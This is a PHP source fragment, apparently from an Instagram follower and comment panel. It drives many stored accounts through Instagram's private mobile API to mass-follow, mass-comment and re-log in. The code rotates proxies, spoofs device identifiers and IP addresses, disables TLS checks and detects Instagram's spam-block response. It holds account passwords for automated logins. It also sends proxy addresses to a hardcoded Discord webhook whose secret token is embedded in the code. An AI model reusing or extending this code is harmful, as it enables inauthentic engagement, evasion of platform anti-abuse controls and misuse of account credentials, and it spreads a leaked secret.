			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}


	private function bot($message, $url)
	{
		$curl = curl_init();

		curl_setopt_array($curl, array(
			CURLOPT_URL => $url,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_ENCODING => "",
			CURLOPT_MAXREDIRS => 10,
			CURLOPT_TIMEOUT => 0,
			CURLOPT_FOLLOWLOCATION => true,
			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
			CURLOPT_CUSTOMREQUEST => "POST",
			CURLOPT_POSTFIELDS => "{\"content\": \"$message\"}",
			CURLOPT_HTTPHEADER => array(
				"Content-Type: application/json",
				"Cookie: __cfduid=d5f1a47b65ad6e5eae8714df12c304b661597580155; __cfruid=f0077b70b216ca6a35ad1f5280ecec475e2dd4cc-1597580155"
			),
		));

		$response = curl_exec($curl);

		curl_close($curl);
		return $response;
	}
	public function follow($userID, $userName)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);

			$requestPosts = [
				'_csrftoken' => $objData['token'],
				'user_id' => $userID,
				'radio_type' => 'wifi-none',
				'_uid' => $objData['username_id'],
				'_uuid' => $objData['uuid']
			];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {

				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://b.i.instagram.com/api/v1/friendships/create/' . $userID . '/', $postData, $headers, $options, $user['data']);
			$rollingCurl->get('https://b.i.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen&persistentBadging=true&use_unified_inbox=true', $headers, $options, $user['data']);
			$headers['X-Ads-Opt-Out'] = 0;
			$headers['X-Google-AD-ID'] = $objData['adid'];
			$headers['X-DEVICE-ID'] = $objData['phone_id'];
			$feedTimeLinePost = 'is_prefetch=0&feed_view_info=&is_async_ads_everclear=0&latest_story_pk=&seen_posts=&phone_id=' . $objData['phone_id'] . '&reason=pull_to_refresh&battery_level=' . rand(50, 100) . '&last_unseen_ad_id=&timezone_offset=28800&_csrftoken=' . $objData['token'] . '&client_session_id=' . Signatures::generateUUID(true) . '&is_pull_to_refresh=1&_uuid=' . $objData['uuid'] . '&is_on_screen=true&unseen_posts=&is_charging=0&is_async_ads_double_request=0&is_async_ads=0&will_sound_on=0&is_async_ads_rti=0';
			$rollingCurl->post('https://b.i.instagram.com/api/v1/feed/timeline/', $feedTimeLinePost, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount, &$userAsns) {
			$isErrored = $request->getResponseError();
			if (empty($isErrored) && stristr($request->getUrl(), '/create/')) {
				$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);

					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($request->identifierParams['isWebCookie'] == 1) {
							if (($donenSonuc['status'] == 'ok') && ($donenSonuc['result'] == 'following')) {
								$totalSuccessCount++;
								$triedUser['status'] = 'success';
							} else {
								$triedUser['status'] = 'fail';
							}
						} else if (($donenSonuc['status'] == 'ok') && ((isset($donenSonuc['friendship_status']) && ($donenSonuc['friendship_status']['following'] === true)) || ($donenSonuc['friendship_status']['is_private'] === true))) {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
						}
					}
				} else {
					$triedUser['head'] = $responseInfo;
					$triedUser['status'] = 'fail';
					$kontrol = json_decode($request->getResponseText(), true);
					$triedUser['text'] = $kontrol;
					if (($kontrol['message'] == 'login_required') || ($kontrol['message'] == 'challenge_required')) {
						$triedUser['durum'] = 0;
					}
					$triedUser['message'] = $kontrol['feedback_message'];
					$triedUser['spam'] = $kontrol['spam'];

					if (($kontrol['feedback_message'] == 'Nous limitons certaines activités pour protéger votre communauté.' && $kontrol['feedback_url'] == 'repute/report_problem/instagram_follow_users/?violation_type&responsible_policy=Ig.Policy.Engagement.SessionClassifier.SessionClassifierBlockAccess')) {
						$triedUser['status'] = 'flag';
						$triedUser['ip'] = $userAsns[0];
					}
				}
				$triedUsers[] = $triedUser;
			}


			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function followResidential($userID, $userName)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();

		$notif_follow_proxy = "https://discord.com/api/webhooks/1048459443504947230/QYx250Pj0-8DL87gR_ncbttfxAbOEWiArZuNO0diu8bHPxIO_cgmmhQOWvITn-Pxbscm";

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getDataFollow();
			$userAsns = Utils::generateAsnsFollow($objData[INSTAWEB_ASNS_KEY_FOLLOW]);

			$requestPosts = [
				'_csrftoken' => $objData['token'],
				'user_id' => $userID,
				'radio_type' => 'wifi-none',
				'_uid' => $objData['username_id'],
				'_uuid' => $objData['uuid']
			];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {
				$this->bot("Notif-follow-proxy: `[" . $userAsns[0] . "]`", $notif_follow_proxy);
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://b.i.instagram.com/api/v1/friendships/create/' . $userID . '/', $postData, $headers, $options, $user['data']);
			$rollingCurl->get('https://b.i.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen&persistentBadging=true&use_unified_inbox=true', $headers, $options, $user['data']);
			$headers['X-Ads-Opt-Out'] = 0;
			$headers['X-Google-AD-ID'] = $objData['adid'];
			$headers['X-DEVICE-ID'] = $objData['phone_id'];
			$feedTimeLinePost = 'is_prefetch=0&feed_view_info=&is_async_ads_everclear=0&latest_story_pk=&seen_posts=&phone_id=' . $objData['phone_id'] . '&reason=pull_to_refresh&battery_level=' . rand(50, 100) . '&last_unseen_ad_id=&timezone_offset=28800&_csrftoken=' . $objData['token'] . '&client_session_id=' . Signatures::generateUUID(true) . '&is_pull_to_refresh=1&_uuid=' . $objData['uuid'] . '&is_on_screen=true&unseen_posts=&is_charging=0&is_async_ads_double_request=0&is_async_ads=0&will_sound_on=0&is_async_ads_rti=0';
			$rollingCurl->post('https://b.i.instagram.com/api/v1/feed/timeline/', $feedTimeLinePost, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount, &$userAsns) {
			$isErrored = $request->getResponseError();
			if (empty($isErrored) && stristr($request->getUrl(), '/create/')) {
				$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);

					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($request->identifierParams['isWebCookie'] == 1) {
							if (($donenSonuc['status'] == 'ok') && ($donenSonuc['result'] == 'following')) {
								$totalSuccessCount++;
								$triedUser['status'] = 'success';
							} else {
								$triedUser['status'] = 'fail';
							}
						} else if (($donenSonuc['status'] == 'ok') && ((isset($donenSonuc['friendship_status']) && ($donenSonuc['friendship_status']['following'] === true)) || ($donenSonuc['friendship_status']['is_private'] === true))) {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
						}
					}
				} else {
					$triedUser['head'] = $responseInfo;
					$triedUser['status'] = 'fail';
					$kontrol = json_decode($request->getResponseText(), true);
					$triedUser['text'] = $kontrol;
					if (($kontrol['message'] == 'login_required') || ($kontrol['message'] == 'challenge_required')) {
						$triedUser['durum'] = 0;
					}
					$triedUser['message'] = $kontrol['feedback_message'];
					$triedUser['spam'] = $kontrol['spam'];

					if (($kontrol['feedback_message'] == 'Nous limitons certaines activités pour protéger votre communaut.' && $kontrol['feedback_url'] == 'repute/report_problem/instagram_follow_users/?violation_type&responsible_policy=Ig.Policy.Engagement.SessionClassifier.SessionClassifierBlockAccess')) {
						$triedUser['status'] = 'flag';
						$triedUser['ip'] = $userAsns[0];
					}
				}
				$triedUsers[] = $triedUser;
			}


			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function commentNew($mediaID, $mediaCode, $commentTexts)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		if (is_array($commentTexts) && !empty($commentTexts)) {
			$arrMediaID = explode('_', $mediaID);
			$mediaIDBeforer = $arrMediaID[0];
			$rollingCurl = new \RollingCurl\RollingCurl();
			$intLoop = -1;

			foreach ($commentTexts as $commentIndex => $comment) {
				$intLoop++;

				if (!isset($this->users[$intLoop])) {
					break;
				}

				$user = $this->users[$intLoop];
				$user['data']['commentIndex'] = $commentIndex;

				if ($user['data']['isWebCookie'] == 1) {
					$objInstagramWeb = $user['object'];
					$objData = $objInstagramWeb->getData();
					$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
					$postData = 'comment_text=' . $comment;
					$headers = ['Referer: https://www.instagram.com/', 'DNT: 1', 'Origin: https://www.instagram.com/', 'X-CSRFToken: ' . trim($objData['token']), 'X-Requested-With: XMLHttpRequest', 'X-Instagram-AJAX: 1', 'Connection: close', 'Cache-Control: max-age=0', 'Accept: */*', 'Accept-Language: fr-FR'];
					$options = [CURLOPT_USERAGENT => isset($objData['web_user_agent']) ? $objData['web_user_agent'] : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14', CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => isset($objData['web_cookie']) ? $objData['web_cookie'] : ''];

					if ($userAsns[0]) {
						$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
						$options[$optionKey] = $userAsns[0];

						if ($userAsns[1]) {
							$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
							$options[$optionKey] = $userAsns[1];
						}
					}

					$rollingCurl->post('https://www.instagram.com/web/comments/' . $mediaIDBeforer . '/add/', $postData, $headers, $options, $user['data']);
				} else {
					$objInstagram = $user['object'];
					$objData = $objInstagram->getData();
					$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
					$requestPosts = ['user_breadcrumb' => Utils::generateUserBreadcrumb(mb_strlen($comment)), 'idempotence_token' => Signatures::generateUUID(true), '_uuid' => $objData['uuid'], '_uid' => $objData['username_id'], '_csrftoken' => $objData['token'], 'comment_text' => $comment, 'containermodule' => 'comments_v2_feed_timeline', 'radio_type' => 'ethernet-none'];
					$requestPosts = Signatures::signData($requestPosts);
					$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
					$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
					$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

					if ($userAsns[0]) {
						$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
						$options[$optionKey] = $userAsns[0];

						if ($userAsns[1]) {
							$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
							$options[$optionKey] = $userAsns[1];
						}
					}

					$rollingCurl->post('https://i.instagram.com/api/v1/media/' . $mediaID . '/comment/', $postData, $headers, $options, $user['data']);
				}
			}
			$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount) {
				$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na', 'commentIndex' => $request->identifierParams['commentIndex']];
				$isErrored = $request->getResponseError();

				if (empty($isErrored)) {
					$responseInfo = $request->getResponseInfo();

					if ($responseInfo['http_code'] == 200) {
						$donenSonuc = json_decode($request->getResponseText(), true);

						if ($donenSonuc) {
							if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
								$obj = $this->users[$request->identifierParams['index']]['object'];
								$obj->organizeCookies($request->getResponseHeaders());
							}

							if ($request->identifierParams['isWebCookie'] == 1) {
								if (isset($donenSonuc['status']) && ($donenSonuc['status'] == 'ok')) {
									$totalSuccessCount++;
									$triedUser['status'] = 'success';
								} else {
									$triedUser['status'] = 'fail';
								}
							} else if (isset($donenSonuc['status']) && ($donenSonuc['status'] == 'ok')) {
								$totalSuccessCount++;
								$triedUser['status'] = 'success';
							} else {
								$triedUser['status'] = 'fail';
							}
						}
					} else {
						$triedUser['status'] = 'fail';
						$kontrol = json_decode($request->getResponseText(), true);
						if (($kontrol['message'] == 'login_required') || ($kontrol['message'] == 'challenge_required')) {
							$triedUser['durum'] = 0;
						}
					}
				}

				$triedUsers[] = $triedUser;
				$rollingCurl->clearCompleted();
				$rollingCurl->prunePendingRequestQueue();
			});
			$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
			$rollingCurl->execute();
		}

		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function relogin()
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY_LOGIN]);
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];
			$requestPosts = ['phone_id' => $objData['phone_id'], '_csrftoken' => $objData['token'], 'username' => $objData['username'], 'adid' => $objData['adid'], 'guid' => $objData['uuid'], 'device_id' => $objData['device_id'], 'password' => $objData['password'], 'login_attempt_count' => '0'];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));

			if ($userAsns[0]) {

				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://i.instagram.com/api/v1/accounts/login/', $postData, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount) {
			$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
			$isErrored = $request->getResponseError();

			if (empty($isErrored)) {
				$responseInfo = $request->getResponseInfo();
				$donenSonuc = json_decode($request->getResponseText(), true);

				if ($responseInfo['http_code'] == 200) {
					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($donenSonuc['status'] == 'ok') {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
						}
					}
				} else if (($responseInfo['http_code'] == 400) && ((isset($donenSonuc['error_type']) && ($donenSonuc['error_type'] == 'bad_password')) || (isset($donenSonuc['message']) && ($donenSonuc['message'] == 'challenge_required')))) {
					$triedUser['status'] = 'fail';
				} else {
					$triedUser['status'] = 'na';
				}
			}

			$triedUsers[] = $triedUser;
			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function validate()
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://i.instagram.com/api/v1/users/receh_man/usernameinfo/', NULL, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount) {
			$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
			$isErrored = $request->getResponseError();

			if (empty($isErrored)) {
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);

					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($donenSonuc['status'] == 'ok') {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
						}
					}
				} else if (($responseInfo['http_code'] == 400) || ($responseInfo['http_code'] == 403)) {
					$triedUser['status'] = 'fail';
				} else {
					$triedUser['status'] = 'na';
				}
			}

			$triedUsers[] = $triedUser;
			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}
}

use Jaeger\Config;
use OpenTracing\Formats;
use OpenTracing\Reference;

class Instagram
{
	protected $userId;
	protected $username;
	protected $password;
	/**
	 * @var Device
	 */
	protected $device;
	public $account_id;
	public $uuid;
	protected $adid;
	protected $phone_id;
	protected $device_id;
	protected $checkpoint_id;
	/**
	 * @var Settings
	 */
	public $settings;
	public $token;
	public $sessionID;
	protected $isLoggedIn = false;
	protected $rank_token;
	protected $IGDataPath;

	public function __construct($username, $password, $account_id, $forceUserIP = false)
	{
		$username = trim($username);
		$password = trim($password);
		$account_id = trim($account_id);
		$this->setUser($username, $password, $account_id, $forceUserIP);
	}

	protected function setUser($username, $password, $account_id, $forceUserIP = false)
	{
		// $_SESSION["account_id"] = $account_id;
		$this->username = $username;
		$this->password = $password;
		$this->account_id = $account_id;

		$this->IGDataPath = Wow::get('project/cookiePath') . 'instagramv3/' . substr($this->account_id, -1) . '/';
		$this->settings = new Settings($this->IGDataPath . $account_id . '.iwb');
		// print_r($this->settings);die();

		// print_r($account_id);die();
		// print_r($this->settings);die();

		$this->checkSettings($forceUserIP);
		$this->uuid = $this->settings->get('uuid');
		$this->adid = $this->settings->get('adid');
		$this->rank_token = $this->account_id . '_' . $this->uuid;
		$this->phone_id = $this->settings->get('phone_id');
		$this->device_id = $this->settings->get('device_id');

		if ($this->settings->get('token') != NULL) {
			$this->isLoggedIn = true;
			$this->token = $this->settings->get('token');
		} else {
			$this->isLoggedIn = false;
		}
	}

	protected function checkSettings($forceUserIP = false)
	{
		$settingsCompare = $this->settings->get('sets');
		$savedDeviceString = $this->settings->get('devicestring');
		$this->device = new Device('136.0.0.34.124', 'fr_FR', $savedDeviceString);
		$deviceString = $this->device->getDeviceString();

		if ($deviceString !== $savedDeviceString) {
			$this->settings->set('devicestring', $deviceString);
		}

		if ($this->settings->get('uuid') == NULL) {
			$this->settings->set('uuid', Signatures::generateUUID(true));
		}

		if ($this->settings->get('adid') == NULL) {
			$this->settings->set('adid', Signatures::generateUUID(true));
		}

		if ($this->settings->get('phone_id') == NULL) {
			$this->settings->set('phone_id', Signatures::generateUUID(true));
		}

		if ($this->settings->get('device_id') == NULL) {
			$this->settings->set('device_id', Signatures::generateDeviceId(md5($this->account_id)));
		}
		if (($this->settings->get('ip') == NULL) || $forceUserIP) {
			$ipAdress = '78.' . rand(160, 191) . '.' . rand(1, 255) . '.' . rand(1, 255);
			if ($forceUserIP && !empty($_SERVER['REMOTE_ADDR'])) {
				$ipAdress = $_SERVER['REMOTE_ADDR'];
			}

			$this->settings->set('ip', $ipAdress);
		}

		if ($this->settings->get('username_id') == NULL) {
			$this->settings->set('username_id', $_SESSION["accountId"]);
		}

		if (0 < INSTAWEB_MAX_ASNS) {
			if (($this->settings->get(INSTAWEB_ASNS_KEY) == NULL) || (INSTAWEB_MAX_ASNS < intval($this->settings->get(INSTAWEB_ASNS_KEY)))) {
				$this->settings->set(INSTAWEB_ASNS_KEY, rand(1, INSTAWEB_MAX_ASNS));
			}
		}

		if (0 < INSTAWEB_MAX_ASNS_LOGIN) {
			if (($this->settings->get(INSTAWEB_ASNS_KEY_LOGIN) == NULL) || (INSTAWEB_MAX_ASNS_LOGIN < intval($this->settings->get(INSTAWEB_ASNS_KEY_LOGIN)))) {
				$this->settings->set(INSTAWEB_ASNS_KEY_LOGIN, rand(1, INSTAWEB_MAX_ASNS_LOGIN));
			}
		}

		if (0 < INSTAWEB_MAX_ASNS_FOLLOW) {
			if (($this->settings->get(INSTAWEB_ASNS_KEY_FOLLOW) == NULL) || (INSTAWEB_MAX_ASNS_FOLLOW < intval($this->settings->get(INSTAWEB_ASNS_KEY_FOLLOW)))) {
				$this->settings->set(INSTAWEB_ASNS_KEY_FOLLOW, rand(1, INSTAWEB_MAX_ASNS_FOLLOW));
			}
		}

		if ($settingsCompare !== $this->settings->get('sets')) {
			$this->settings->save();
		}
	}

	public function getData()
	{
		return ['username' => $this->username, 'password' => $this->password, 'username_id' => $this->account_id, 'uuid' => $this->uuid, 'token' => $this->token, 'rank_token' => $this->rank_token, 'user_agent' => $this->device->getUserAgent(), 'ip' => $this->settings->get('ip'), 'cookie' => $this->settings->get('cookie'), INSTAWEB_ASNS_KEY => $this->settings->get(INSTAWEB_ASNS_KEY)];
	}

	public function getDataFollow()
	{
		return ['username' => $this->username, 'password' => $this->password, 'username_id' => $this->account_id, 'uuid' => $this->uuid, 'token' => $this->token, 'rank_token' => $this->rank_token, 'user_agent' => $this->device->getUserAgent(), 'ip' => $this->settings->get('ip'), 'cookie' => $this->settings->get('cookie'), INSTAWEB_ASNS_KEY_FOLLOW => $this->settings->get(INSTAWEB_ASNS_KEY_FOLLOW)];
	}

	public function twoFactorLogin($verificationCode, $twoFactorIdentifier)
	{
		$verificationCode = trim(str_replace(' ', '', $verificationCode));
		$requestPosts = ['verification_code' => $verificationCode, 'two_factor_identifier' => $twoFactorIdentifier, '_csrftoken' => $this->token, 'username' => $this->username, 'device_id' => $this->device_id, 'password' => $this->password];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$login = $this->request('accounts/two_factor_login/', $postData, false);

		if ($login[1]['status'] == 'fail') {
			throw new Exception($login[1]['message']);
		}

		$this->isLoggedIn = true;
		$this->settings->set('last_login', time());
		$this->settings->save();
		return $login[1];
	}

	public function kodgonder($choice, $apipath)
	{
		$requestPosts = ['choice' => $choice, '_csrftoken' => $this->token, 'guid' => $this->uuid, 'device_id' => $this->device_id];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$send_code = $this->request('https://i.instagram.com/api/v1' . $apipath, $postData, false, true);
		return $send_code[1];
	}

	public function kodonayla($code, $apipath)
	{
